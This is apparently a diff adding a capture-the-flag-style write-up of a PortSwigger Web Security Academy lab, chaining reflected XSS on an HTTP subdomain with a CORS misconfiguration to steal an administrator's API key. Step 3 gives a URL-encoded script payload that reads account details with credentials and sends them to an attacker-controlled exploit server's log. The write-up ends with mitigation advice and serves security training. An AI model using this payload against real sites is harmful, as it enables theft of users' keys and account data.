@@ -96,3 +96,47 @@ Create an HTML payload on the Exploit Server using a sandboxed iframe. We use a 
 Submit the extracted API key to solve the lab. 
 
 **Key Takeaway / Mitigation:** Never whitelist the null origin in a production environment. The null origin is NOT synonymous with "trusted internal request." Any malicious website can easily spawn a sandboxed iframe to originate requests with a null origin.
+
+
+
+
+
+# Final lab
+
+#  Lab: CORS vulnerability with trusted insecure protocols
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Chain an XSS vulnerability on an insecure HTTP subdomain with a CORS misconfiguration to steal the administrator's API key.
+**Vulnerability:** Vulnerability Chaining (XSS + Insecure Protocol CORS Trust). The application strictly validates the CORS `Origin` but insecurely trusts all subdomains, including those over HTTP.
+
+##  The Concept (The Trojan Horse via XSS)
+A server might properly reject arbitrary origins like `hacker.com`, but implicitly trust its own subdomains (e.g., `stock.target.com`). If the server fails to distinguish between secure (`https://`) and insecure (`http://`) protocols for these subdomains, it creates a massive blind spot. 
+If an attacker finds a Cross-Site Scripting (XSS) vulnerability on any of those trusted subdomains (especially an insecure HTTP one), they can inject a malicious CORS payload *into* that subdomain. When the victim visits the rigged URL, the payload executes originating from the trusted subdomain. The main API blindly issues the `Access-Control-Allow-Origin` grant, and the XSS payload exfiltrates the sensitive data to the attacker.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Identify the Weak Subdomain
+Inspect the target network traffic. Note that the main application loads resources from `http://stock.YOUR-LAB-ID.web-security-academy.net`. Note the HTTP scheme.
+
+### Step 2: Identify the Injection Point (XSS)
+Test the `stock` subdomain parameters. The `productId` parameter is vulnerable to Reflected XSS.
+
+### Step 3: Craft the Chained Exploit Payload
+On the Exploit Server, create a script that redirects the victim to the vulnerable HTTP `stock` URL, appending a URL-encoded XMLHttpRequest script into the `productId` parameter.
+
+```html
+<script>
+    // Redirect victim to the vulnerable trusted HTTP subdomain, triggering the XSS payload
+    document.location="[http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=%3Cscript%3Evar%20req%20%3D%20new%20XMLHttpRequest()%3B%20req.onload%20%3D%20function()%20%7Bdocument.location%3D'https%3A%2F%2FYOUR-EXPLOIT-SERVER-ID.exploit-server.net%2Flog%3Fkey%3D'%2BencodeURIComponent(this.responseText)%3B%7D%3B%20req.open('GET'%2C'https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2FaccountDetails'%2Ctrue)%3B%20req.withCredentials%3Dtrue%3Breq.send()%3B%3C%2Fscript%3E&storeId=1](http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=%3Cscript%3Evar%20req%20%3D%20new%20XMLHttpRequest()%3B%20req.onload%20%3D%20function()%20%7Bdocument.location%3D'https%3A%2F%2FYOUR-EXPLOIT-SERVER-ID.exploit-server.net%2Flog%3Fkey%3D'%2BencodeURIComponent(this.responseText)%3B%7D%3B%20req.open('GET'%2C'https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2FaccountDetails'%2Ctrue)%3B%20req.withCredentials%3Dtrue%3Breq.send()%3B%3C%2Fscript%3E&storeId=1)"
+</script>
+```
+
+### Step 4: Exfiltrate and Submit
+1. Replace all placeholder IDs. Store and Deliver exploit to victim.
+
+2. Navigate to the Exploit Server's Access log.
+
+3. Locate the exfiltrated GET /log?key=... request and extract the apikey.
+
+4. Submit the API key to solve the lab. 
+
+**Key Takeaway / Mitigation:** CORS configurations must strictly define allowed origins, explicitly including the protocol scheme (https://). Trusting subdomains blindly, especially over HTTP, renders the main application vulnerable to vulnerabilities present anywhere else in the infrastructure. Always sanitize inputs to prevent XSS, as XSS fundamentally breaks SOP and CORS boundaries.
